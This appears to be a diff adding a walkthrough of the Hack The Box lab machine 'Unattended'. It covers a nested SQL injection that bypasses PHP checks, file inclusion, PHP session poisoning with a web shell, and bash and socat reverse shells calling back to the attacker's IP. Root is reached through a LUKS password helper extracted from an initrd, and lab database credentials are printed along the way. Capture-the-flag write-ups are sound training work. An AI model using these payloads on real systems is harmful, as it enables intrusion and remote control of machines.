@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/unattended.png
-tags: ["HTB"]
+tags: ["HTB", "sqli", "sqlmap", "nginx", "nginx-aliases", "lfi", "session-poisoning", "socat", "hidepid", "noexec", "mysql", "initrd", "cpio"]
 ---
 
 # Unattended
@@ -398,7 +398,334 @@ foreach ($_COOKIE as $key => $val) {
 
 /* removed everything because of undergoing investigation, please check dev and staging */
 ```
-## User
 
+- We control the `id` value
+- But we have to bypass several checks from `(array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids))`
+  - `array_key_exists('id', $_GET)` - The parameter needs to be present
+  - `in_array(intval($_GET['id']),$valid_ids)` - The number should be from `valid_ids`
+  - `intval($_GET['id']) == $_GET['id']` - It uses `==` operator, which is [different from `===`](https://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp)  
+    - Another thing is that `intval` processes the string which starts with `int`, while it drops the rest of it
+```
+php > echo intval("13");
+13
+php > echo intval("13 TEST");
+13
+php > 
+```
+
+- Okay, since we got familiar with checks, we have to inject our payload to: 
+  - `SELECT name FROM idname where id = '".$_GET['id']."'`
+  - `SELECT path from filepath where name = '".$tpl."'`
+- `SELECT name FROM idname where id = '".$_GET['id']."'` returns the page if it exists in the table or it will return us the `main` page
+  - We have to control the output of the query
+  - So we can make it return `False` then `UNION` query anything we want
+  - The statement will be executed since it's a valid one and passes the check `$result->num_rows > 0` 
+  - The payload will be in the form of: `<VALID_ID>' AND 1=2 UNION SELECT "<ANYTHING>"-- -`
+  - We can test it with `https://www.nestedflanders.htb/index.php?id=id=465' and 1=2 union select "about"-- -`
+    - It should return `about` page
+
+![](./images/3.png)
+
+- Now, we have to inject to second query `SELECT path from filepath where name = '".$tpl."'`
+  - The payload will had `<VALID_ID>' AND 1=2 UNION SELECT "<ANYTHING>"`
+  - Now we place the second payload instead of `ANYTHING`
+    - Don't forget to escape the quotes
+  - Now, we have: `<VALID_ID>' AND 1=2 UNION SELECT "TEST\' UNION SELECT \"/etc/passwd\"-- -"-- -`
+  - For example, `https://www.nestedflanders.htb/index.php?id=465' and 1=2 union select "test\' union select \"/etc/passwd\"-- -"-- -`
+
+![](./images/4.png)
+
+- To get a shell, we can perform `log/session poisoning`
+  - There are 2 paths:
+    - via `/var/log/nginx/access.log`
+      - https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions
+    - or via session cookie and `/var/lib/php/sessions/`
+      - https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions
+  - I have already done the attack in other boxes via first method, so I will try to do it using second one
+    - https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session
+  - First, we need to know our `PHPSESSID`
+    - Then we prepend the prefix, like `sess_<PHPSESSID>`
+    - Now using via `LFI` we read `/var/lib/php/sessions/sess_<PHPSESSID>`
+
+![](./images/5.png)
+
+- Now, we can set another cookie
+  - Make sure add space before new cookie
+
+![](./images/6.png)
+
+- We now can insert `php` code, which should be executed
+  - `SHELL=<?php system($_REQUEST['cmd']); ?>` - the code should be url-encoded
+
+![](./images/7.png)
+
+- Great, let's get reverse shell
+  - `bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/443 0>&1'` - url-encoded
+
+![](./images/8.png)
+
+
+## User
+- Looks like `hidepid` is configured
+  - https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/
+```
+www-data@unattended:/var/www/html$ ps awuxx
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+www-data   678  0.0  0.3 180664  6864 ?        S    09:21   0:00 nginx: worker process
+www-data  1163  0.0  0.0   4288   740 ?        S    09:29   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'
+www-data  1164  0.0  0.1  17944  2816 ?        S    09:29   0:00 bash -c bash -i >& /dev/tcp/10.10.16.4/443 0>&1
+www-data  1165  0.0  0.1  18168  3316 ?        S    09:29   0:00 bash -i
+www-data  1187  0.0  0.4  35912  8468 ?        S    09:31   0:00 python3 -c import pty;pty.spawn("/bin/bash")
+www-data  1188  0.0  0.1  18192  3252 pts/0    Ss   09:31   0:00 /bin/bash
+www-data  1203  0.0  0.1  36636  2812 pts/0    R+   09:32   0:00 ps awuxx
+
+```
+
+- `noexec` is configured on `tmp` and `/dev/shm`
+```
+www-data@unattended:/$ mount | grep -e "tmp " -e shm
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
+tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
+```
+
+- Let's check `mysql`, since there is nothing else to check
+```
+www-data@unattended:/$ mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 33
+Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| neddy              |
++--------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [(none)]> use neddy;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [neddy]> show tables;
++-----------------+
+| Tables_in_neddy |
++-----------------+
+| config          |
+| customers       |
+| employees       |
+| filepath        |
+| idname          |
+| offices         |
+| orderdetails    |
+| orders          |
+| payments        |
+| productlines    |
+| products        |
++-----------------+
+11 rows in set (0.00 sec)
+
+MariaDB [neddy]> 
+
+```
+
+- Let's check `config` table
+```
+MariaDB [neddy]> select * from config;
++-----+-------------------------+--------------------------------------------------------------------------+
+| id  | option_name             | option_value                                                             |
++-----+-------------------------+--------------------------------------------------------------------------+
+|  54 | offline                 | 0                                                                        |
+|  55 | offline_message         | Site offline, please come back later                                     |
+|  56 | display_offline_message | 0                                                                        |
+|  57 | offline_image           |                                                                          |
+|  58 | sitename                | NestedFlanders                                                           |
+|  59 | editor                  | tinymce                                                                  |
+|  60 | captcha                 | 0                                                                        |
+|  61 | list_limit              | 20                                                                       |
+|  62 | access                  | 1                                                                        |
+|  63 | debug                   | 0                                                                        |
+|  64 | debug_lang              | 0                                                                        |
+|  65 | dbtype                  | mysqli                                                                   |
+|  66 | host                    | localhost                                                                |
+|  67 | live_site               |                                                                          |
+|  68 | gzip                    | 0                                                                        |
+|  69 | error_reporting         | default                                                                  |
+|  70 | ftp_host                | 127.0.0.1                                                                |
+|  71 | ftp_port                | 21                                                                       |
+|  72 | ftp_user                | flanders                                                                 |
+|  73 | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |
+|  74 | ftp_root                | /                                                                        |
+|  75 | ftp_enable              | 1                                                                        |
+|  76 | offset                  | UTC                                                                      |
+|  77 | mailonline              | 1                                                                        |
+|  78 | mailer                  | mail                                                                     |
+|  79 | mailfrom                | nested@nestedflanders.htb                                                |
+|  80 | fromname                | Neddy                                                                    |
+|  81 | sendmail                | /usr/sbin/sendmail                                                       |
+|  82 | smtpauth                | 0                                                                        |
+|  83 | smtpuser                |                                                                          |
+|  84 | smtppass                |                                                                          |
+|  85 | smtppass                |                                                                          |
+|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
+|  87 | smtphost                | localhost                                                                |
+|  88 | smtpsecure              | none                                                                     |
+|  89 | smtpport                | 25                                                                       |
+|  90 | caching                 | 0                                                                        |
+|  91 | cache_handler           | file                                                                     |
+|  92 | cachetime               | 15                                                                       |
+|  93 | MetaDesc                |                                                                          |
+|  94 | MetaKeys                |                                                                          |
+|  95 | MetaTitle               | 1                                                                        |
+|  96 | MetaAuthor              | 1                                                                        |
+|  97 | MetaVersion             | 0                                                                        |
+|  98 | robots                  |                                                                          |
+|  99 | sef                     | 1                                                                        |
+| 100 | sef_rewrite             | 0                                                                        |
+| 101 | sef_suffix              | 0                                                                        |
+| 102 | unicodeslugs            | 0                                                                        |
+| 103 | feed_limit              | 10                                                                       |
+| 104 | lifetime                | 1                                                                        |
+| 105 | session_handler         | file                                                                     |
++-----+-------------------------+--------------------------------------------------------------------------+
+```
+
+- We can insert and update entires in `neddy` database
+```
+MariaDB [neddy]> SHOW GRANTS;
++-----------------------------------------------------------------------------------------------------------------------+
+| Grants for nestedflanders@localhost                                                                                   |
++-----------------------------------------------------------------------------------------------------------------------+
+| GRANT USAGE ON *.* TO 'nestedflanders'@'localhost' IDENTIFIED BY PASSWORD '*9E1AD37C883F20EE8B5FB34B4B150262F9671A58' |
+| GRANT SELECT, INSERT, UPDATE ON `neddy`.* TO 'nestedflanders'@'localhost'                                             |
++-----------------------------------------------------------------------------------------------------------------------+
+2 rows in set (0.00 sec)
+```
+
+- The interesting entry is `checkrelease` which has a value of `/home/guly/checkbase.pl;/home/guly/checkplugins.pl;`
+  - Maybe there is an execution happening, but since we can't run `pspy` due to `hidepid`, we can only test it by changing
+  - The box has no `nc`, but has `socat` installed
+  - update config set option_value = "socat TCP:10.10.16.4:6666 EXEC:'bash -li',pty,stderr,setsid,sigint,sane" where id = 86;
+```
+MariaDB [neddy]> update config set option_value = "socat TCP:10.10.16.4:80 EXEC:'bash -li',pty,stderr,setsid,sigint,sane" where id = 86;
+Query OK, 1 row affected (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MariaDB [neddy]> select * from config where id = 86;
++----+--------------+-------------------------------------------------------------------------+
+| id | option_name  | option_value                                                            |
++----+--------------+-------------------------------------------------------------------------+
+| 86 | checkrelease | socat TCP:10.10.16.4:80 EXEC:'bash -li',pty,stderr,setsid,sigint,sane |
++----+--------------+-------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+```
+
+- After few seconds we receive a connection
+
+![](./images/9.png)
 
 ## Root
+- User groups show us unusual group `grub`, which is not listed in https://wiki.debian.org/SystemGroups
+```
+guly@unattended:~$ id
+uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)
+```
+
+- Let's check the files/directories owned by that group
+```
+guly@unattended:~$ find / -group grub 2>/dev/null
+/boot/initrd.img-4.9.0-8-amd64
+guly@unattended:~$ file /boot/initrd.img-4.9.0-8-amd64
+/boot/initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Wed Sep 28 10:31:45 2022, from Unix
+```
+- It's a [initrd](https://docs.kernel.org/admin-guide/initrd.html)
+  - `initrd provides the capability to load a RAM disk by the boot loader. This RAM disk can then be mounted as the root file system and programs can be run from it.`
+  - Since it contains initial settings and executables, let's check if there is something interesting
+    - Lets uncompress it via `zcat /boot/initrd.img | cpio -idmv`
+    - https://access.redhat.com/solutions/24029
+```
+guly@unattended:/dev/shm/archive$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv
+.
+boot
+boot/guid
+<SNIP>
+```
+```
+guly@unattended:/dev/shm/archive$ ls
+bin  boot  conf  etc  init  lib  lib64  run  sbin  scripts
+```
+
+- Started with looking at the scripts folder
+  - Noticed `cryptroot` script
+  - While scrolling through, we see an interesting comment by `guly`
+```
+guly@unattended:/dev/shm/archive/scripts$ ls -lha  local-top/
+total 20K
+drwxr-xr-x 2 guly guly  100 Oct 29 10:02 .
+drwxr-xr-x 8 guly guly  220 Oct 29 10:02 ..
+-rwxr-xr-x 1 guly guly  721 May  9  2017 cryptopensc
+-rwxr-xr-x 1 guly guly 9.3K Dec 20  2018 cryptroot
+-rw-r--r-- 1 guly guly  162 Sep 28  2022 ORDER
+```
+```
+<SNIP>
+# guly: we have to deal with lukfs password sync when root changes her one
+if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
+/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
+                message "cryptsetup: cryptsetup failed, bad password or options?"
+                sleep 3
+                continue
+        fi
+fi
+
+<SNIP>
+```
+
+- We have `if` block with `crypttarget="$crypttarget" cryptsource="$cryptsource" /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen`
+  - We see an execution `uinitrd c0m3s3f0ss34nt4n1` passed to `$cryptopen`, which is a `cryptsetup`
+    - `Cryptsetup provides an interface for configuring encryption on block devices (such as /home or swap partitions), using the Linux kernel device mapper target dm-crypt. It features integrated Linux Unified Key Setup (LUKS) support.`
+    - https://man7.org/linux/man-pages/man8/cryptsetup.8.html
+  - So `uinitrd` probably passes a password to `cryptsetup`
+    - https://superuser.com/questions/1179046/passing-luks-passphrase-to-unlock-encrypted-rootfs-with-script-instead-of-passin
+```
+<SNIP>
+# Prepare commands
+cryptopen="/sbin/cryptsetup -T 1"
+if [ "$cryptdiscard" = "yes" ]; then
+        cryptopen="$cryptopen --allow-discards"
+fi
+<SNIP>
+```
+
+- Let's try running it
+  - I forgot we had `noexec` set, so I had to move the binary `guly` home directory
+```
+guly@unattended:/dev/shm/archive$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
+bash: ./sbin/uinitrd: Permission denied
+guly@unattended:/dev/shm/archive$ chmod +x ./sbin/uinitrd
+guly@unattended:/dev/shm/archive$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
+bash: ./sbin/uinitrd: Permission denied
+```
+```
+uly@unattended:/dev/shm/archive$ cp ./sbin/uinitrd ~/
+guly@unattended:/dev/shm/archive$ chmod +x ~/uinitrd 
+guly@unattended:/dev/shm/archive$ ~/uinitrd c0m3s3f0ss34nt4n1
+132f93ab100671dcb263acaf5dc95d8260e8b7c6
+```
+
+- We can `su` as `root`
+```
+/dev/shm/archive$ su -
+Password: 
+root@unattended:~#
+```
